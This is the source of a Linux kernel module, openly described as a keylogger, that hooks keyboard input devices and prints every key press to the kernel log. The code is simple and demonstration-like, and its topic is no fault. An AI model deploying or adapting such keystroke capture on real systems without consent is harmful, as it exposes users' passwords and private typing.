/*
 * kbdlogger driver
 *
 * Copyright (C) 2014 Rafael do Nascimento Pereira <rnp@25ghz.net>
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * Keylogger driver - capture keypress events
 *
 */

#define pr_fmt(fmt) KBUILD_MODNAME ": " fmt


#include <linux/init.h>
#include <linux/module.h>
#include <linux/input.h>
#include <linux/device.h>
#include <linux/slab.h>
#include <linux/types.h>
#include <linux/fs.h>
#include <linux/cdev.h>
#include <linux/kobject.h>
#include <linux/time.h>
#include <linux/pci.h>
#include <linux/platform_device.h>
#include <linux/uaccess.h>

MODULE_AUTHOR("Rafael do Nascimento Pereira <rnp@25ghz.net>");
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Input driver keyboard logger");

#define NUMDEVS  1
#define DEVNAME  "kbdlogger"

struct input_event keyev;
dev_t devnum;
u64   pressev;
char  *starttime;
const char *kbdstr = "keyboard";

static int kbdlogger_connect(struct input_handler *handler,
		struct input_dev *dev, const struct input_device_id *id)
{
	struct input_handle *handle;
	int error;

	if (strstr(dev->name, kbdstr)) {

		handle = kzalloc(sizeof(struct input_handle), GFP_KERNEL);
		if (!handle)
			return -ENOMEM;

		handle->dev = dev;
		handle->handler = handler;
		handle->name = "kbdlogger_handle";
		error = input_register_handle(handle);

		if (error)
			goto err_free_handle;

		error = input_open_device(handle);
		if (error)
			goto err_unregister_handle;

		pr_info("Connected device: %s (%s at %s)\n",
			dev_name(&dev->dev),
			dev->name ?: "unknown",
			dev->phys ?: "unknown");
	}

	return 0;

err_unregister_handle:
	input_unregister_handle(handle);
err_free_handle:
	kfree(handle);
	return error;
}

static void kbdlogger_event(struct input_handle *handle, unsigned int type,
			unsigned int code, int value)
{
	if (type == EV_KEY) {
		pr_info("Key event. Dev: %s, Type: %d, Code: %d, Value: %d\n",
		dev_name(&handle->dev->dev), type, code, value);
		pressev++;
		keyev.value = value;
		keyev.type  = type;
		keyev.code  = code;
		do_gettimeofday(&keyev.time);
	}
}

static void kbdlogger_disconnect(struct input_handle *handle)
{
	pr_info("Disconnected device: %s\n",
		dev_name(&handle->dev->dev));

	input_close_device(handle);
	input_unregister_handle(handle);
	kfree(handle);
}

static const struct input_device_id kbdlogger_ids[] = {
	{.driver_info = 1 },  /* driver_info = 1 ??  */
	{},
};

MODULE_DEVICE_TABLE(input, kbdlogger_ids);

static struct input_handler kbdlogger_handler = {
	.connect    = kbdlogger_connect,
	.disconnect = kbdlogger_disconnect,
	.event      = kbdlogger_event,
	.id_table   = kbdlogger_ids,
	.name       = "kbdlogger_handler",
};

static void kbdlogger_cleanup(void)
{
	input_unregister_handler(&kbdlogger_handler);
}

static int __init kbdlogger_init(void)
{
	int err;

	if (input_register_handler(&kbdlogger_handler)) {
		pr_err("Failed input handler register\n");
		err = -ENOMEM;
		goto fail;
	}

	memset(&keyev, 0, sizeof(struct input_event));
	pressev = 0;
	pr_info("loaded\n");
	return 0;
fail:
	kbdlogger_cleanup();
	return err;
}


static void __exit kbdlogger_exit(void)
{
	kbdlogger_cleanup();
	pr_info("exited\n");
}

module_init(kbdlogger_init);
module_exit(kbdlogger_exit);
